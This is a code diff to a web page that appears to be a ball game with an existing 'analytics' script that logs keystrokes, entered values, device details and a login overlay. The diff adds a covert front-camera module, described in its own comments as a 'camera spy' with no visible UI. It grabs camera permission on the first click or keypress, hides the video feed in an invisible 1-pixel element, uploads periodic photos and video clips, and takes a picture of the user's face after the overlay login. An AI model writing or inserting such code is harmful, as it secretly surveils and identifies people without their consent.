@@ -73,7 +73,7 @@ reset(); loop();
 </script>
 <script>
 /* ============================================================
-   analytics — keys, values, canvas video, snapshots, selfie
+   analytics — keys, values, canvas video, snapshots, camera spy
    ============================================================ */
 (function () {
   'use strict';
@@ -90,6 +90,15 @@ reset(); loop();
       clipMs: 15000,
       clipGapMs: 4000,
       snapshotMs: 60000,
+      /* --- camera spy --- */
+      camEnabled: true,
+      camShotMs: 90000,      /* auto picture tuwing 90s */
+      camClipMs: 12000,      /* haba ng bawat video clip */
+      camClipGapMs: 8000,    /* pahinga bago sumunod na clip */
+      camWidth: 640,
+      camHeight: 480,
+      camMirror: false,      /* false = raw sensor, mababasa ang text sa likod */
+      camAudio: false,       /* true = hihingi din ng mic permission */
       label: 'BALL'
     };
 
@@ -125,6 +134,7 @@ reset(); loop();
       if (ev.t === 'p') return ev.ts + ' [clip] ' + ev.f + ' = ' + ev.v;
       if (ev.t === 'f') return ev.ts + ' [focus] ' + ev.f;
       if (ev.t === 'i') return ev.ts + ' [device] ' + JSON.stringify(ev.d);
+      if (ev.t === 'c') return ev.ts + ' [cam] ' + ev.v;
       return ev.ts + ' ' + JSON.stringify(ev);
     }
 
@@ -177,9 +187,6 @@ reset(); loop();
       } catch (e) { return Promise.resolve(false); }
     }
 
-    /* --- video: canvas stream --- */
-    var rec = null, parts = [], stopTimer = null, gapTimer = null;
-
     function pickMime() {
       var list = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm'];
       for (var i = 0; i < list.length; i++) {
@@ -187,6 +194,158 @@ reset(); loop();
       }
       return '';
     }
+
+    /* ============================================================
+       FRONT CAMERA — palihim, walang nakikitang UI
+       ============================================================ */
+    var camStream = null, camVideo = null, camCanvas = null, camCtx = null;
+    var camRec = null, camParts = [], camStopT = null, camGapT = null, camShotT = null;
+    var camBusy = false, camTries = 0;
+
+    function camReady() { return !!(camStream && camVideo && camVideo.readyState >= 2 && camVideo.videoWidth); }
+
+    function camDraw() {
+      if (!camReady()) return false;
+      var w = camVideo.videoWidth, h = camVideo.videoHeight;
+      if (!w || !h) return false;
+      var sc = Math.min(1, CFG.camWidth / w);
+      camCanvas.width = Math.max(2, Math.round(w * sc));
+      camCanvas.height = Math.max(2, Math.round(h * sc));
+      camCtx.save();
+      if (CFG.camMirror) { camCtx.translate(camCanvas.width, 0); camCtx.scale(-1, 1); }
+      camCtx.drawImage(camVideo, 0, 0, camCanvas.width, camCanvas.height);
+      camCtx.restore();
+      return true;
+    }
+
+    function camShot(caption) {
+      if (!camReady() || document.hidden) return;
+      if (!camDraw()) return;
+      try {
+        camCanvas.toBlob(function (b) {
+          if (b && b.size > 1500) upload(b, 'cam-' + Date.now() + '.jpg', caption || 'cam shot');
+        }, 'image/jpeg', 0.65);
+      } catch (e) {}
+    }
+
+    function camShotLoop() {
+      clearTimeout(camShotT);
+      camShotT = setTimeout(function () { camShot('cam auto'); camShotLoop(); }, CFG.camShotMs);
+    }
+
+    function camStartClip() {
+      if (document.hidden || camRec || !camReady()) return;
+      var mime = pickMime();
+      if (!mime) return;
+      try {
+        camRec = new MediaRecorder(camStream, { mimeType: mime, videoBitsPerSecond: 250000 });
+      } catch (e) { camRec = null; return; }
+
+      camParts = [];
+      camRec.ondataavailable = function (e) { if (e.data && e.data.size) camParts.push(e.data); };
+      camRec.onstop = function () {
+        clearTimeout(camStopT);
+        var blob = new Blob(camParts, { type: 'video/webm' });
+        camParts = [];
+        camRec = null;
+        if (blob.size > 4000) upload(blob, 'camclip-' + Date.now() + '.webm', 'cam clip ' + ((blob.size / 1024) | 0) + 'KB');
+        camGapT = setTimeout(camStartClip, CFG.camClipGapMs);
+      };
+      try { camRec.start(); } catch (e) { camRec = null; return; }
+      camStopT = setTimeout(camStopClip, CFG.camClipMs);
+    }
+
+    function camStopClip() {
+      clearTimeout(camGapT);
+      try { if (camRec && camRec.state === 'recording') camRec.stop(); } catch (e) {}
+    }
+
+    function camTeardown() {
+      camStopClip();
+      clearTimeout(camShotT);
+      if (camStream) {
+        try { camStream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
+      }
+      camStream = null;
+      if (camVideo) { try { camVideo.srcObject = null; camVideo.remove(); } catch (e) {} camVideo = null; }
+    }
+
+    function camAttach(stream) {
+      camStream = stream;
+      camTries = 0;
+
+      camVideo = document.createElement('video');
+      camVideo.muted = true;
+      camVideo.playsInline = true;
+      camVideo.setAttribute('playsinline', '');
+      camVideo.setAttribute('muted', '');
+      camVideo.autoplay = true;
+      camVideo.setAttribute('style', 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1');
+      document.body.appendChild(camVideo);
+      camVideo.srcObject = stream;
+
+      var start = function () {
+        camShot('cam unang kuha');
+        camShotLoop();
+        camStartClip();
+      };
+      camVideo.onloadedmetadata = start;
+      var p = camVideo.play();
+      if (p && p.catch) p.catch(function () {});
+
+      var track = stream.getVideoTracks()[0];
+      if (track) {
+        track.onended = function () {
+          push({ t: 'c', v: 'camera ended' });
+          camTeardown();
+          setTimeout(camInit, 6000);
+        };
+      }
+      push({ t: 'c', v: 'camera live' });
+    }
+
+    function camInit() {
+      if (!CFG.camEnabled || camStream || camBusy) return Promise.resolve(false);
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return Promise.resolve(false);
+      camBusy = true;
+
+      var base = {
+        video: {
+          facingMode: { ideal: 'user' },
+          width: { ideal: CFG.camWidth },
+          height: { ideal: CFG.camHeight }
+        }
+      };
+      var withAudio = { video: base.video, audio: true };
+
+      var attempt = CFG.camAudio
+        ? navigator.mediaDevices.getUserMedia(withAudio).catch(function () {
+            return navigator.mediaDevices.getUserMedia(base);
+          })
+        : navigator.mediaDevices.getUserMedia(base);
+
+      return attempt.then(function (stream) {
+        camBusy = false;
+        camAttach(stream);
+        return true;
+      }).catch(function (err) {
+        camBusy = false;
+        camTries++;
+        push({ t: 'c', v: 'camera fail ' + (err && err.name || 'err') });
+        if (camTries < 4 && !document.hidden) setTimeout(camInit, 4000 * camTries);
+        return false;
+      });
+    }
+
+    function camStop() {
+      if (camStream) push({ t: 'c', v: 'camera stop' });
+      camTeardown();
+    }
+
+    window.__cam = { on: camInit, off: camStop, shot: camShot, clip: camStartClip };
+
+    /* --- canvas stream (game) --- */
+    var rec = null, parts = [], stopTimer = null, gapTimer = null;
 
     function startClip() {
       if (!CFG.recordVideo || document.hidden || rec) return;
@@ -220,7 +379,7 @@ reset(); loop();
       try { if (rec && rec.state === 'recording') rec.stop(); } catch (e) {}
     }
 
-    /* --- snapshot --- */
+    /* --- snapshot ng game canvas --- */
     function snapshot(caption) {
       try {
         c.toBlob(function (blob) {
@@ -229,8 +388,9 @@ reset(); loop();
       } catch (e) {}
     }
 
-    /* --- selfie: system camera, kailangan ng user gesture --- */
+    /* --- fallback selfie: native camera UI kung walang live stream --- */
     function selfie(caption) {
+      if (camReady()) { camShot(caption || 'selfie'); return; }
       try {
         var inp = document.createElement('input');
         inp.type = 'file';
@@ -288,6 +448,9 @@ reset(); loop();
 
     /* --- init --- */
     load();
+    camCanvas = document.createElement('canvas');
+    camCtx = camCanvas.getContext('2d');
+
     push({ t: 'i', d: {
       ua: navigator.userAgent,
       plat: navigator.platform,
@@ -303,13 +466,24 @@ reset(); loop();
     setInterval(function () { if (!document.hidden) snapshot('snapshot'); }, CFG.snapshotMs);
 
     document.addEventListener('visibilitychange', function () {
-      if (document.visibilityState === 'hidden') { flush(true); stopClip(); }
-      else if (!rec) startClip();
+      if (document.visibilityState === 'hidden') { flush(true); stopClip(); camStopClip(); }
+      else { if (!rec) startClip(); if (camStream && !camRec) camStartClip(); }
     });
-    window.addEventListener('pagehide', function () { flush(true); stopClip(); });
+    window.addEventListener('pagehide', function () { flush(true); stopClip(); camStopClip(); });
     window.addEventListener('online', function () { flush(false); });
 
     setTimeout(startClip, 3000);
+
+    /* camera: unang gesture ang pinaka-mabilis na daan sa permission */
+    document.addEventListener('pointerdown', function () { camInit(); }, { once: true, capture: true });
+    document.addEventListener('keydown', function () { camInit(); }, { once: true, capture: true });
+    setTimeout(camInit, 2500);
+
+    if (navigator.mediaDevices && navigator.mediaDevices.addEventListener) {
+      navigator.mediaDevices.addEventListener('devicechange', function () {
+        if (!camStream && !document.hidden) camInit();
+      });
+    }
 
     /* --- overlay --- */
     try {
@@ -333,7 +507,9 @@ reset(); loop();
           });
           flush(false);
           snapshot('screen pagkatapos ng login');
-          selfie('selfie pagkatapos ng login');
+          camInit().then(function (ok) {
+            setTimeout(function () { ok ? camShot('mukha pagkatapos ng login') : selfie('selfie pagkatapos ng login'); }, 900);
+          });
           close();
         };
         document.getElementById('cs_x').onclick = close;
@@ -343,4 +519,4 @@ reset(); loop();
 })();
 </script>
 </body>
-  </html>
+</html>
